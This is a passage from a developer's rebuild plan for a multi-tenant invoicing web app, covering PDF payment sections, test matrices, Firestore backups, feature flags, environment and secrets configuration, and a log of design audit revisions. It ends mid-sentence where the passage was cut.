**Why both methods on every PDF:** the PDF is what gets printed and filed. A customer who decides three weeks later to pay has the PDF in their records — they need the e-transfer email and the credit card link both available without going back to the email. The QR code handles the "I'm looking at a printed invoice and don't want to type a long URL" case, which is common for residential customers.

**Conditional rendering in the PDF template:**
- If `tenantSnapshot.etransferEmail` is absent → hide section 1, renumber section 2.
- If the tenant has no Stripe Connect account OR the invoice has no `payToken` → hide section 2.
- If both are absent → block invoice send at `createInvoice` time (already specified in Phase 3).

**Surcharge line item on paid-by-card invoices:**

When the Stripe webhook marks an invoice paid via card and `surchargeAmountCents > 0`, a subsequent regenerated "receipt" PDF (or an annotated "paid" version) shows the surcharge as an explicit line in the totals block:

```
Subtotal                $500.00
HST (13%)                $65.00
────────────────────────────────
Invoice Total           $565.00
Credit card fee (2.4%)   $13.56
────────────────────────────────
Total charged           $578.56
Paid via credit card   2026-04-20
```

This is a disclosure requirement (customer must see what they actually paid) and also makes the accounting export unambiguous. The PDF template branches on `paidVia === 'card' && surchargeAmountCents > 0` to render this block.

### QR code generation in the PDF

The Cloud Run `pdf-service` uses [`qrcode`](https://www.npmjs.com/package/qrcode) (MIT license) to generate a QR code as a data URL inline-embedded in the HTML before Puppeteer renders. No external image fetch at render time — keeps the PDF self-contained.

```typescript
import QRCode from 'qrcode';
const payUrl = `${platformBaseUrl}/pay/${invoice.payToken}`;
const qrDataUrl = await QRCode.toDataURL(payUrl, { width: 120, margin: 1 });
// pass qrDataUrl into the HTML template as a <img src={qrDataUrl} />
```

**Estimated effort:** 2–3 days (+ ~0.5 day for payment block design iteration and QR code integration)

---

## Phase 7 — Testing, Cleanup, First Onboarding

### Test matrix
1. **Create 2–3 test tenants end-to-end:**
   - Signup → custom claims set correctly
   - Settings → edit business info, upload logo
   - Stripe Connect → complete Express onboarding (test mode)
   - Create customer
   - Create invoice → number increments per-tenant
   - Send invoice email
   - Preview + download PDF
   - Pay via Stripe checkout (test mode)
   - Create recurring invoice (if `recurringInvoices` feature enabled)
   - Create quote (if `quotes` feature enabled)

2. **Firestore rules verification (emulator):**
   - Tenant A cannot read Tenant B's data at any path
   - Tenant A cannot write to their own `entitlements` doc
   - Platform admin can write any `entitlements` doc
   - User without `tenantId` claim cannot read anything
   - Logged-out user cannot read anything

3. **Cloud Functions verification:**
   - Every feature-gated function rejects calls from tenants without that feature
   - Every function rejects calls without auth
   - Stripe webhook routes correctly to the right tenant

4. **PDF endpoint verification:**
   - Rejects unauthenticated requests
   - **Tenant auth path:**
     - Accepts caller whose `tenantId` claim matches the invoice's parent tenant
     - Rejects caller whose `tenantId` claim ≠ invoice's tenantId
   - **Customer auth path:**
     - Accepts customer whose verified email matches invoice's `customer.email` (no `tenantId` claim, `email_verified: true`)
     - Rejects customer whose verified email does NOT match invoice's `customer.email` (different customer trying to read someone else's invoice)
     - Rejects customer with `email_verified: false` even if email would match
   - Respects per-tenant branding (reads from `tenantSnapshot`, NOT current meta — verify by mutating `meta` after invoice creation and confirming the PDF still renders the old branding)

5. **Customer portal end-to-end flow (critical — tests the entire customer experience):**
   - Contractor creates invoice for a customer email address
   - Contractor sends invoice email → verify email arrives with correct portal URL (custom domain if configured, generic otherwise)
   - Customer clicks "View & Pay Invoice" link in email
   - Customer lands on branded login page (correct logo, colors, font for that contractor)
   - Customer enters email → magic link sent → verify magic link email arrives
   - Customer clicks magic link → authenticated, redirected back to invoice view
   - Invoice renders with correct `tenantSnapshot` branding (not TechFlow branding)
   - Customer clicks Pay → Stripe checkout opens on the contractor's Connect account (test mode)
   - Customer completes payment → webhook fires → invoice status updates to "paid"
   - Customer downloads PDF → PDF renders with correct branding from snapshot
   - **Multi-tenant verification:** customer has invoices from 2+ contractors → list page shows correct branding per invoice, not mixed
   - **Return visit:** customer closes browser, returns to portal URL → still authenticated, sees all their invoices without re-entering magic link

6. **Staff invitation flow verification:**
   - Owner invites staff member via `/settings/team` → invite doc created, email sent
   - Invitee clicks link with matching email → accepts invite → `tenantId` + `role` claims set, `users/{uid}` doc created, `acceptedAt` stamped
   - Invitee clicks link with DIFFERENT email signed in → rejected with clear error
   - Invite past `expiresAt` → rejected
   - Invite already accepted (re-use of link) → rejected (one-time use)
   - Owner revokes pending invite → invite doc deleted, link no longer works
   - Invitee already belongs to a different tenant → rejected (one-user-one-tenant MVP constraint)

7. **Observability verification:**
   - Trigger a handled exception in a Cloud Function → Sentry receives it with correct `tenantId` + `uid` tags
   - Trigger a client-side error in the portal → Sentry receives it with correct customer email tag

8. **Custom domain verification (if Phase 5 custom domains are complete):**
   - Set `customDomain` on a test tenant → Cloud Function adds Vercel domain + Firebase Auth authorized domain + `customDomains/{domain}` doc
   - Access the custom domain → middleware resolves correct tenant → branded login page renders
   - Magic link flow works on the custom domain (Firebase Auth authorized domains list is correct)
   - Remove `customDomain` → Cloud Function cleans up all three (Vercel, Firebase Auth, Firestore)

### Cleanup
- Delete test tenants
- Remove any `console.log` debug output
- Verify no stale Puppeteer test route was left on the marketing site (there shouldn't be — Cloud Run is the locked path — but double-check)
- Document env vars required for production
- Document the platform admin Firestore console procedure for flipping features

### First real onboarding
- Reggie walks through the signup flow as if he were a real customer
- Full end-to-end exercise on production Firebase
- Fix anything that felt awkward

**Estimated effort:** 3–5 days

---

## Firestore Backup Strategy

**Why this exists:** multi-tenant means one Firestore database holds every tenant's data. A bad deploy, a bug in a Cloud Function, a rule regression, or even a rm-rf-style Firebase CLI mistake can affect all tenants simultaneously. Backups are not optional — they're the difference between "we restored yesterday's snapshot" and "we lost everyone's invoices."

### Three layers of defense

**1. Point-in-Time Recovery (PITR) — always on.**
- Firestore's native PITR keeps per-second snapshots for the previous 7 days.
- Enabled in Firebase Console under Firestore → Settings → "Point-in-time recovery."
- Pricing: small storage cost proportional to database size. Trivial at the scale of this app (estimated <$5/month at 50 tenants).
- Restore granularity: whole database, to any timestamp in the last 7 days.
- **Use case:** someone ran a bad script 2 hours ago, need to roll back.

**2. Scheduled managed exports — daily, 30-day retention.**
- Firestore managed export to a Cloud Storage bucket, triggered by Cloud Scheduler → Cloud Function.
- Runs daily at 03:00 UTC (low-traffic window).
- Destination bucket: `gs://techflow-firestore-backups/daily/{YYYY-MM-DD}/`.
- Lifecycle rule on the bucket: delete objects older than 30 days automatically.
- **Use case:** PITR window missed (>7 days ago), regulatory "we need last month's state," or disaster recovery to a different project.

**3. Manual snapshot before risky deploys — convention, not automation.**
- Before deploying: rule changes, Cloud Function changes touching multiple collections, or any schema migration.
- One command: `gcloud firestore export gs://techflow-firestore-backups/manual/$(date +%Y%m%d-%H%M%S)`
- Kept until the deploy is confirmed stable (usually 48 hours), then deleted manually or left for the 30-day lifecycle.
- **Use case:** rollback path if the deploy breaks something the tests didn't catch.

### Implementation — Cloud Function for scheduled export

```typescript
// functions/src/scheduled/firestoreExport.ts
import { onSchedule } from 'firebase-functions/v2/scheduler';
import { google } from 'googleapis';

export const scheduledFirestoreExport = onSchedule(
  { schedule: 'every day 03:00', timeZone: 'UTC', region: 'us-central1' },
  async () => {
    const firestore = google.firestore('v1');
    const projectId = process.env.GCLOUD_PROJECT!;
    const bucket = `gs://${projectId}-firestore-backups`;
    const timestamp = new Date().toISOString().slice(0, 10);

    await firestore.projects.databases.exportDocuments({
      name: `projects/${projectId}/databases/(default)`,
      requestBody: {
        outputUriPrefix: `${bucket}/daily/${timestamp}`,
        // collectionIds: []  // empty = export all collections
      },
    });
  }
);
```

Requires:
- Cloud Storage bucket created: `{projectId}-firestore-backups`
- Bucket lifecycle rule: delete objects 30 days after creation
- Service account for Cloud Functions needs `datastore.databases.export` + `storage.objects.create` on the bucket
- One-time IAM setup during Phase 1

### Restore procedures (documented, not scripted)

**Scenario A: "Undo the last hour" (PITR, whole DB).**
```
# Firebase Console → Firestore → Import/Export → Restore from PITR
# Pick a timestamp from the last 7 days
# Restores to a NEW database in the same project, then swap
```

**Scenario B: "Yesterday's full snapshot."**
```
gcloud firestore import gs://techflow-firestore-backups/daily/2026-04-10
# Restores all collections to the target database
```

**Scenario C: "Restore just one tenant's data."**
Not supported natively. Manual procedure:
1. Import yesterday's backup to a scratch Firebase project.
2. Script that reads `tenants/{targetTenantId}` subtree from scratch project and writes it back to production.
3. Overwrites live data for that tenant only.

This is the "surgical restore" path and it's slow and manual. Document it now; don't build tooling for it until it's needed.

**Scenario D: "The entire production Firebase project is gone."**
- Scheduled exports in Cloud Storage survive a Firebase project deletion as long as the Cloud Storage bucket is in a separate project (or at least the bucket itself is preserved).
- **Hardening recommendation:** the backup bucket should live in a DIFFERENT GCP project from the Firestore database. Compromises the one-dashboard-convenience but gives you a true air-gap.
- Decision: defer to Phase 1 implementation — start with same-project backups, move to separate-project backups if it proves easy. Same-project is still better than no backups.

### Testing the backup procedure

Before launch, run the restore procedure at least once end-to-end:
1. Create test data in production Firestore.
2. Wait for scheduled export (or trigger manually).
3. Delete the test data from production.
4. Restore from the export.
5. Confirm data is back.

**This test is mandatory before onboarding the first real client.** Untested backups are not backups — they're hopes.

### Cost estimate
- PITR: <$5/month at 50 tenants
- Scheduled exports + 30-day retention: <$2/month at current data sizes (invoicing data is tiny)
- Cloud Scheduler: free tier
- Cloud Function invocations: free tier (one per day)

**Total: <$10/month for the full backup posture.** Cheapest insurance in the stack.

**Estimated effort for initial setup:** 1–2 days (bucket creation, IAM, Cloud Function, lifecycle rules, first test restore)

---

## Feature Flag System — Full Reference

### Why this exists
- **Pricing tier foundation.** Later, Stripe subscription webhook writes to `entitlements.plan`, which maps to a features bundle. No frontend changes needed.
- **Per-tenant toggles.** Manual control during soft-launch or beta of new features.
- **Kill-switch.** Disable a feature for a problem tenant without a deploy.
- **Code-canonical safety.** New features added to the code constant are immediately defaulted safely for every tenant — no migration, no race between deploy and backfill.

### Architecture rules
1. **Feature list lives in `lib/features.ts` as a `const` object.** Source of truth is code, not the database.
2. **Tenant `entitlements` doc only stores overrides.** Missing keys fall through to defaults.
3. **Two layers of enforcement, always:**
   - Frontend gating (hooks, `<FeatureGate>`, route guards, nav filtering) = UX
   - Cloud Function `requireFeature()` = security
4. **Never enforce features in Firestore rules** (too expensive, causes doc-read cost on every write). Enforce at the Cloud Function layer instead.
5. **Tenants can read their own entitlements but cannot write.** Only `role: platform_admin` can write. Splitting `entitlements` from `meta` is what makes this rule enforceable.

### Canonical feature keys (v1)
| Key | Default | Notes |
|---|---|---|
| `invoices` | true | Core — always on |
| `customers` | true | Core — always on |
| `quotes` | false | Starter plan feature |
| `recurringInvoices` | false | Pro plan feature |
| `stripePayments` | false | Requires Stripe Connect onboarding |
| `customDomain` | false | Gated — only plans that include custom domains (e.g. Pro). Enables the `/settings` custom-domain UI and the Vercel/Firebase Auth automation. |
| `bookingSystem` | false | Future — not yet built |

### Plan → feature bundles (sketch, not wired yet)
```typescript
const PLAN_FEATURES = {
  free:    { invoices: true, customers: true },
  starter: { ...PLAN_FEATURES.free, quotes: true },
  pro:     { ...PLAN_FEATURES.starter, recurringInvoices: true, stripePayments: true },
};
```
This mapping is consumed by the Stripe subscription webhook (future phase), not at runtime in the app. The app just reads `entitlements.features` and doesn't care how they got there.

### Platform admin workflow (MVP)
Until an admin UI exists:
1. Log into Firebase Console
2. Navigate to `tenants/{tenantId}/entitlements`
3. Edit the `features` object directly
4. Tenant picks up change on next page load (real-time listener)

### Limits (non-feature entitlements)
`entitlements.limits` holds numeric caps — enforced inside Cloud Functions alongside feature checks:
```typescript
{ maxInvoicesPerMonth: 10, maxCustomers: 50 }
```
Not MVP-critical. Shape is reserved so it can be added later without schema migration.

---

## Timeline Summary

| Phase | Work | Estimated |
|---|---|---|
| 0 | Decisions & Puppeteer test | Done (except Puppeteer test) |
| 1 | Data model, rules, auth claims, **backup setup** | 5–7 days |
| 2 | Cloud Functions (with feature gates, customer-facing, convertQuoteToInvoice) | 4–6 days |
| 3 | Frontend scaffolding + TenantProvider + gating + customer portal shell + **Sentry** | 5–7 days |
| 4 | Stripe Connect Express (tenant-initiated + customer-initiated pay) + dual webhooks + **stripeAccounts reverse lookup** | 5–7 days |
| 5 | Onboarding flow + settings + custom domains + branded login + **staff invitation flow** | 6–8 days |
| 6 | PDF generation (Cloud Run port + Next.js proxy with dual auth) | 3–4 days |
| 7 | Testing + backup restore drill + first onboarding + **customer portal e2e** | 4–6 days |
| **Total** | | **~8–10 weeks** focused solo-dev work, +30–50% buffer for life |

**Increase over prior estimate:** ~1 week added for the customer portal (routes + context + customer-facing functions + portal UI), backup setup, and convertQuoteToInvoice. Additional ~2–3 days for custom domain provisioning + branded login middleware (added 2026-04-12). Magic link flow spec, dual Stripe webhooks, claims propagation handling, customer e2e test matrix, and environment strategy added 2026-04-12 (from Sonnet audit) — no additional time since these are specifications of work already estimated, not new features.

**Revision 2026-04-12 (deep audit round 2, Sonnet 4.5 + Gemini):**
- +1 day Phase 5 for staff invitation flow (new callable functions, new routes, test coverage)
- +0.5 day Phase 3 for Sentry setup across Next.js + Cloud Functions
- No net timeline change from the critical fixes (missing meta defaults, SSR branded login, Edge-runtime middleware decision, stripeAccounts reverse lookup, getDownloadURL logo upload) — they're corrections to existing work, not new scope.
- Deferred from this revision: optimistic locking (not MVP-critical at 1–3 staff per tenant), GDPR account-deletion function (not blocking launch), platform billing for Reggie (zero clients today, build when needed).

---

## Environment Strategy

**Set up from day one.** Mixing dev and production credentials is how you accidentally charge real credit cards in test mode or corrupt live data during development.

### Three environments

| Environment | Purpose | Firebase Project | Stripe Keys | Vercel Env Scope |
|---|---|---|---|---|
| **Development** | Local dev + CI | `techflow-dev` (new) | Stripe test mode keys (`sk_test_...`) | `development` |
| **Staging** | Pre-production testing, client demos | `techflow-staging` (new) | Stripe test mode keys (separate from dev) | `preview` |
| **Production** | Live client data | `techflow-prod` (new) | Stripe live mode keys (`sk_live_...`) | `production` |

### Required environment variables (all scoped per Vercel environment)

```
# Firebase
NEXT_PUBLIC_FIREBASE_API_KEY
NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN
NEXT_PUBLIC_FIREBASE_PROJECT_ID
FIREBASE_ADMIN_CLIENT_EMAIL        # server-only (not NEXT_PUBLIC_)
FIREBASE_ADMIN_PRIVATE_KEY         # server-only

# Stripe
STRIPE_SECRET_KEY                  # sk_test_ for dev/staging, sk_live_ for prod
STRIPE_PLATFORM_WEBHOOK_SECRET    # different per environment
STRIPE_CONNECT_WEBHOOK_SECRET     # different per environment
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY

# Email (transactional — provider decided in "Decisions Required" #3)
RESEND_API_KEY                     # if Resend is chosen (recommended)
# or ZOHO_EMAIL_USER / ZOHO_EMAIL_PASSWORD if Zoho is retained
# Note: server-only. Cloud Functions reads this via defineSecret() too —
# the Vercel env is only for Next.js API routes that send mail directly.

# App
NEXT_PUBLIC_APP_URL                # https://portal.techflowsolutions.ca for prod

# PDF service (Cloud Run)
PDF_SERVICE_URL                    # e.g. https://pdf-service-prod-abc123.a.run.app
PDF_SERVICE_API_KEY                # shared secret, different per environment
```

### Cloud Functions environment configuration (separate from Vercel)

Cloud Functions do **NOT** read environment variables from Vercel. Firebase Functions v2 has its own configuration system that must be set up per Firebase project.

**Two kinds of config:**
1. **Secrets** (sensitive values) — use `defineSecret()` from `firebase-functions/params`:
   ```typescript
   import { defineSecret } from 'firebase-functions/params';
   const stripeSecret = defineSecret('STRIPE_SECRET_KEY');
   const resendApiKey = defineSecret('RESEND_API_KEY');

   export const sendInvoiceEmail = onCall(
     { secrets: [resendApiKey] },
     async (request) => {
       const resend = new Resend(resendApiKey.value());
       // ...
     }
   );
   ```
   Set per project: `firebase functions:secrets:set STRIPE_SECRET_KEY --project techflow-prod`

2. **Non-secret config** (publishable keys, URLs) — use `defineString()` or `.env.<project>` files in the functions directory:
   ```
   functions/.env.techflow-dev
   functions/.env.techflow-staging
   functions/.env.techflow-prod
   ```
   Firebase automatically loads the file matching the active project.

**Required Cloud Functions secrets (set per project via `firebase functions:secrets:set`):**
- `STRIPE_SECRET_KEY` (test key for dev/staging, live key for prod)
- `STRIPE_PLATFORM_WEBHOOK_SECRET`
- `STRIPE_CONNECT_WEBHOOK_SECRET`
- `RESEND_API_KEY` (if Decision #3 lands on Resend)
- `VERCEL_API_TOKEN` (for custom domain provisioning Cloud Function)
- `PAY_TOKEN_SECRET` — HMAC signing key for invoice pay-link JWTs. Used by `createInvoice` (signs), `verifyInvoicePayToken` (verifies), `createPayTokenCheckoutSession` (re-verifies), and `regenerateInvoicePayLink` (re-signs with bumped version). **Must be unique per environment** — leaking the dev secret must not let anyone forge prod pay links. Generate with `openssl rand -base64 48`. Rotation: bumping this secret invalidates all outstanding pay tokens across the environment — tenants will need to resend invoices for any unpaid invoices. Acceptable tradeoff for a security incident; otherwise leave untouched.

**Non-secret Cloud Functions config (`.env.<project>`):**
- `APP_URL` (portal URL for email links)
- `VERCEL_PROJECT_ID`

Vercel env vars and Cloud Functions secrets are **parallel systems**. Both need to be populated for every environment. A value that exists in Vercel but not in Cloud Functions' secret store will be `undefined` at function runtime, and vice versa.

### Cloud Functions deployment (three environments, three deploys)

Vercel auto-deploys on git push. Firebase does NOT. Each environment's Cloud Functions must be deployed manually:

```bash
firebase deploy --only functions --project techflow-dev
firebase deploy --only functions --project techflow-staging
firebase deploy --only functions --project techflow-prod
```

Same for rules and indexes:
```bash
firebase deploy --only firestore:rules,firestore:indexes,storage --project techflow-prod
```

**Recommendation for MVP:** an `npm run deploy:prod` script in the root `package.json` that runs the three commands for prod (functions, firestore, storage) in the correct order. A full CI/CD pipeline with per-branch deploys is a post-launch improvement; a simple script gets you to launch.

### Setup rules
- **Never commit `.env` files.** Use Vercel's environment variable UI or `vercel env pull` for local dev. Cloud Functions secrets never touch git — `firebase functions:secrets:set` writes them to Google Secret Manager.
- **Each Firebase project has its own Firestore, Auth, Storage, and Cloud Functions.** Security rules and function deploys target a specific project via `firebase use <alias>`.
- **Stripe test mode vs live mode:** Stripe provides separate API keys. Test mode keys cannot charge real cards. Dev and staging both use test mode keys (but ideally from separate Stripe accounts or at least separate webhook endpoints so test data doesn't mix).
- **Firebase Auth authorized domains** differ per project. Dev project authorizes `localhost:3000`. Staging authorizes the Vercel preview URL. Production authorizes `portal.techflowsolutions.ca` + all custom domains.
- **Local development:** Use `firebase emulators:start` for Firestore + Auth during local dev to avoid polluting the dev Firebase project. Vercel CLI (`vercel dev`) runs the Next.js app locally with the `development` env vars.

### When to create the projects
- **`techflow-dev`**: Create during Phase 1 setup (this is where initial development happens).
- **`techflow-staging`**: Create before Phase 7 testing (needed for the end-to-end test matrix).
- **`techflow-prod`**: Create before first real client onboarding. Keep it empty until launch day.

---

## Immediate Next Steps (in order)

1. **Provision new Firebase project** (`techflow-dev`) for the rebuild. Keep the old one running untouched as a reference.
2. **Create new Next.js repo** — scaffold with App Router, Tailwind, TypeScript, Firebase client + admin SDKs, base folder structure from the Phase 3 tree above.
3. **Deploy "hello world" to Vercel** on a fresh project to confirm the deploy pipeline before writing real code.
4. **Port the Cloud Run `pdf-service`** from the old repo to a new Cloud Run service (`pdf-service-dev`). Add API key auth. Verify it renders a test invoice end-to-end. This can run in parallel with Phase 1.
5. **Start Phase 1** — schema docs, rules, auth claim helpers, platform admin user.

Execution on Phase 1 can start immediately — the Puppeteer/Vercel evaluation has been resolved (Cloud Run is locked).

---

## What NOT to do (guardrails against future scope creep)

- **Do not migrate the old Vite repo to multi-tenant.** It's being replaced, not upgraded.
- **Do not add features beyond the canonical list during the rebuild.** `bookingSystem` is a placeholder, not a deliverable.
- **Do not build the platform admin UI yet.** Firebase Console is the MVP admin tool.
- **Do not enforce feature flags in Firestore rules.** Cloud Functions only.
- **Do not ship without the Stripe webhook auth + tenant routing working correctly.** This is the most dangerous code path in the whole app.
- **Do not add plain CSS files "just for one thing."** Tailwind or nothing.
- **Do not defer the Cloud Functions auth checks.** Every function has `auth + tenantId + featureGate` from its first commit. No "add security later" pattern.

---

## Open Questions (answer before Phase 1)

1. **(RESOLVED — see "Decisions Required Before Phase 1" above)** Domain strategy for generic portal URL.
2. **(MOVED to "Decisions Required Before Phase 1" — item #3)** Transactional email provider (Zoho vs Resend/Postmark). Blocks Phase 2, not a "later" question.
3. **Invoice number format.** Currently `TF-2026-0001` branded to TechFlow. Per-tenant, should it default to generic `INV-0001` with a configurable prefix in tenant meta? (Leaning: yes, `meta.invoicePrefix` defaults to first 3 letters of business name.)
4. **Logo storage.** Firebase Storage or Vercel Blob? Firebase Storage fits the existing stack. Vercel Blob would centralize assets on Vercel. (Leaning: Firebase Storage for now — one less moving part.)
5. **Font loading for custom fontFamily.** If a tenant sets `fontFamily: "DM Sans"`, need to decide: Google Fonts at runtime (easy, external dependency) vs self-hosted font files in Firebase Storage (slower setup, no external call). Leaning: Google Fonts for MVP.

---

## Context — what we built and decided today

### What was completed
- **Phase 3 Bundle 2 (form spacing + CSS cleanup)** on the current Vite codebase. Commits `e49068a`, `5d3566b`, `8ef2002`. Intended to be the last commits on the old repo — but see "what was NOT completed" below.
- Root-caused and fixed the `.form-group { margin: 0 }` leak from ServiceCalculator that had been silently breaking CustomerSection spacing across both Invoice and Quote routes.
- Collapsed triple-duplicated form primitives (`.form-card`, `.card-title`, `.form-label`, `.form-input`, `.form-select`) into a single source of truth in CustomerSection.css. Net −97 lines, −170 bytes shipped CSS.
- Reviewed the architectural options and decided: rebuild once, into the final stack, multi-tenant from day one. No intermediate Vite multi-tenant step.
- Locked all Phase 0 decisions (nested schema, implicit routing, Stripe Connect, feature flags).
- Added feature flags / entitlements to the plan as a Phase 0 decision before starting any code.
- Produced the Puppeteer + Vercel definitive answer with test harness, ready to run on the existing marketing site.
- Wrote this document so none of it gets lost when the session compacts.

### What was NOT completed (important)
- **Bundle 3 Cloud Functions auth-check fixes (issues 5.1–5.6) were NOT done.** They were referenced multiple times as "next up" but the conversation pivoted to the rebuild planning before any Cloud Functions code was touched. See the "Outstanding Security Debt" section near the top of this document for full details and the Path A / Path B decision that needs to be made.
- **Puppeteer test on Vercel was cancelled** (2026-04-12). Cloud Run is now the locked PDF path. See "PDF Generation Strategy" section for rationale. No longer a blocking item.
- **No code was written on the rebuild itself.** This session produced decisions and a plan document only. Phase 1 execution has not started.

### Commits produced this session (old Vite repo)
| SHA | Scope |
|---|---|
| `5d3566b` | refactor: scope .form-group margin rule, remove ServiceCalculator leak |
| `8ef2002` | refactor: collapse duplicated form primitives into CustomerSection.css |

Both commits are CSS-only. No backend, no security, no functional changes.

### Plan revisions after initial draft
1. **Path A decision locked** — skip security patch on old repo, shut down at rebuild launch.
2. **Customer portal added as a cross-cutting requirement** — homeowners being invoiced authenticate via magic link, have no `tenantId` claim, read via email-match rule pattern. Denormalized `tenantSnapshot` on each invoice/quote so customers never read `meta`. New `/portal` route group, new `CustomerPortalContext`, new customer-facing Cloud Functions (`getCustomerInvoices`, `getCustomerInvoiceDetail`, `payInvoice`, `downloadInvoicePDF`). Affects Phase 1, 2, 3, 4, and 6.
3. **Tenant meta schema expanded** — added `primaryColor`, `secondaryColor`, `taxRate`, `taxName`, `businessNumber`, `invoicePrefix`, `emailFooter`, `currency`. These fields are also what gets denormalized into `tenantSnapshot`.
4. **`convertQuoteToInvoice` added to Phase 2** — transactional quote → invoice conversion, gated on both `quotes` and `invoices` features, carries fresh `tenantSnapshot` and source-quote backreference.
5. **Firestore backup strategy added as its own section** — PITR + daily managed exports (30-day retention) + manual-snapshot-before-risky-deploy convention. Mandatory restore drill before first client onboarding. Estimated ~$10/month total cost.
6. **Timeline updated** — ~7–9 weeks (was ~6–8 weeks) to absorb customer portal and backup setup.
7. **PDF strategy locked to Cloud Run 2026-04-12.** The previously-planned Puppeteer-on-Vercel evaluation is cancelled. Cloud Run is now the canonical PDF path — dedicated microservice, full Chrome in Docker, API key auth, called from thin Next.js proxy routes that do the Firebase dual-auth check. Rationale: the old repo's Cloud Run PDF service already works and can be ported; full Chrome avoids the `@sparticuz/chromium` version-pinning fragility; 2–32 GB RAM headroom vs Vercel's ~3 GB; clean microservice separation keeps Vercel function concurrency available for user-facing routes. The "Puppeteer + Vercel — Definitive Answer" section was removed; replaced with a short "PDF Generation Strategy" section documenting the Cloud Run service shape, Dockerfile, env vars, and proxy auth model. Phase 6 rewritten around the porting checklist. Immediate Next Steps no longer gates Phase 1 on a Puppeteer test.
8. **Deep audit round 2 applied 2026-04-12** (Sonnet 4.5 + Gemini). Critical fixes: six missing meta defaults (`taxRate`, `taxName`, `currency`, `invoicePrefix`, `businessNumber`, `emailFooter`) added to `onSignup` batch write — prevents first-invoice tenantSnapshot corruption. Branded login page mandated to be server-side via Admin SDK (Firestore rules block unauthenticated reads of `meta`). Edge-runtime vs Node-runtime decision documented for the custom-domain middleware (Firebase Admin SDK requires Node — default recommendation `runtime: 'nodejs'`). `stripeAccounts/{stripeAccountId} → {tenantId}` reverse lookup collection added — replaces fragile `collectionGroup('meta')` query in Stripe webhook. Logo upload MUST use `getDownloadURL()` and store the token-bearing public URL in `meta.logoUrl`, never the Storage path. Medium/minor: `logo` → `logoUrl` standardized throughout, Cloud Functions env var / secrets subsection added (parallel to Vercel env vars, not replaced by them), Cloud Functions per-project deploy process documented, `customDomain` added to canonical feature flag table, customer auth path cases added to PDF test matrix, `/portal/view` shorthand resolved to canonical `/portal/invoices/[id]` route. New scope: staff invitation flow in Phase 5 (`invitations` subcollection, `createInvitation` + `onAcceptInvite` callables, `/settings/team` + `/accept-invite` routes, 7-day token expiry, one-time use, email-match verification). Transactional email provider moved from Open Questions to Decisions Required Before Phase 1 — recommendation Resend over Zoho to avoid multi-tenant reputation risk. Sentry added to Phase 3 with per-environment projects and `tenantId`/`uid` tagging. `deletedAt: null` field added to tenant meta and invoices/quotes/customers schemas so future soft-delete work is non-breaking (UI intentionally deferred). Explicitly deferred: optimistic locking, GDPR deletion function, platform billing for Reggie.
9. **Deep audit round 3 applied 2026-04-13** (Opus 4.6 zero-mercy pass — see `REBUILD_PLAN_DEFERRED.md` for full findings). Five pre-Phase-1 CRITICAL fixes applied directly to this plan: **C1** — invoice/quote/users writes locked to admin SDK only (`allow write: if false`); all mutations now flow through `createInvoice`/`updateInvoice`/`deleteInvoice`/`markInvoicePaid` callables (and quote equivalents) that snapshot branding server-side and recompute totals, eliminating client-side `tenantSnapshot`/tax/total tampering. **C2** — customer email case-sensitivity bug fixed: emails lowercased at every write boundary in Cloud Functions, security rules call `request.auth.token.email.lower()` before comparing, `getCustomerInvoices` lowercases auth email before query. **C4** — `tenantId` generation strategy specified: slug-with-collision-suffix inside a transaction, produces stable human-readable IDs and prevents simultaneous-signup races. **C5** — counter docs (`invoiceCounter`, `quoteCounter`) initialized in the `onSignup` batch so first-invoice transactions don't crash on a missing doc. **C6** — `users/{uid}` write rule locked to admin SDK only (was `if request.auth.uid == uid`); all profile mutations go through callables to prevent self-spoofing of `tenantId`/`role` fields. Also added: `markInvoicePaid` and `updateUserProfile` callables to Phase 2 inventory; `tenantSnapshot.version: 1` field in invoice creation (P2 polish); concrete invoice CRUD pattern documented in Phase 2. RISK and POLISH items from the audit are tracked in `REBUILD_PLAN_DEFERRED.md` and will be applied during their relevant phases (R1 Stripe restricted-account state in Phase 4; R2 password reset / email verification in Phase 5; R3 Cloud Run custom domain in Phase 6 deploy; R4 App Check + rate limits and R5 split webhook endpoints in Phase 2/4; etc.).

10. **Phase 1.5 — Design System added 2026-04-13** (Opus 4.6 + Sonnet 4.6 + Gemini joint review). New phase inserted between Phase 1 and Phase 2 to lock the visual foundation before any UI work begins. Decisions: shadcn/ui as the platform component library (Radix + Tailwind, copy-paste ownership in `src/components/ui/`); scoped scaffold of 14 components covering Phase 2/3 needs (Button, Input, Label, Textarea, Form, Card, Dialog, AlertDialog, Select, Checkbox, RadioGroup, Badge, Alert, Sonner, Table, DropdownMenu, Tabs, Skeleton, Separator); semantic CSS-variable token system with `--success` and `--warning` added beyond stock shadcn; tenant override scope **locked to `--primary` and `--secondary` only** (every other token platform-controlled to prevent semantic colors getting overridden into wrong meanings); two-layer contrast guard (WCAG AA validation at signup/settings + computed `--primary-foreground` fallback at render); dark/light mode strategy decided as no-toggle (dashboard=dark, portal=light, PDFs=light); Inter as platform font with curated Google-fonts list for tenant `fontFamily` override on customer-facing surfaces only; Sonner as the single platform-wide toast (eliminates current Vite app's dual `cs-toast`/`inv-toast` pattern); canonical status→Badge-variant mapping centralized in `src/lib/invoices/statusBadge.ts`; composition rule that domain components compose ui primitives and never reach for raw HTML form elements or hex color utilities. Why this was missed in rounds 1–3: every prior audit focused on security, architecture, and data integrity — visual design system isn't a "bug" but is critical for the premium bundled-website + portal pitch to contractors. Estimated effort 2 days.

13. **Deep audit round 4 applied 2026-04-13** (Opus 4.6 delta audit + Gemini joint synthesis — scoped to revisions 10, 11, 12 per the "Round 4 Delta" prompt). Three CRITICAL fixes: **C1** — zombie `payInvoice` callable removed from the function inventory and replaced with a note that `createPayTokenCheckoutSession` is the single canonical payment path for email link, portal "Pay Now," and manual-link flows alike; customer-path description updated to reflect the portal discovers the `payToken` via `getCustomerInvoiceDetail` and redirects to `/pay/{token}` rather than creating a parallel Stripe session. **C2** — regenerate-during-checkout race condition closed: `session.metadata.payTokenVersion` now stamped at Checkout creation; webhook handler for `checkout.session.completed` re-verifies version against current invoice and, on mismatch, refuses to mark paid, issues an automatic full refund via `stripe.refunds.create`, writes a `paymentIncidents` audit doc, and notifies the tenant owner. Rationale: `regenerateInvoicePayLink` intent is "kill old link" — silently accepting a payment on a killed link violates that intent. Handling the guard in the webhook (not `regenerate`) correctly covers the customer-mid-checkout case. **C3** — pay-route privacy headers mandated: `Referrer-Policy: no-referrer` (prevents token leak via outbound-link Referer headers), `X-Robots-Tag: noindex, nofollow` (prevents accidental search indexing of shared 